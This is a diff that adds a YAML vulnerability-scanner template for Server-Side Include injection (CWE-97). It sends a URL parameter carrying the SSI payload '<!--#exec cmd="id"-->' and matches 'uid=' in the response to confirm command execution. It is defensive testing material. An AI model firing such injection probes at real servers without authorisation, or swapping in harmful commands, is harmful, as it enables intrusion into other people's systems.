@@ -1,0 +1,21 @@
+id: whai-ssi-injection
+
+info:
+  name: Server-Side Include (SSI) Injection
+  author: whitehat-ai
+  severity: high
+  description: Tests for SSI injection
+  tags: ssi,injection,high
+  classification:
+    cwe-id: CWE-97
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?name=<!--%23exec%20cmd="id"-->'
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=\\d+\\("
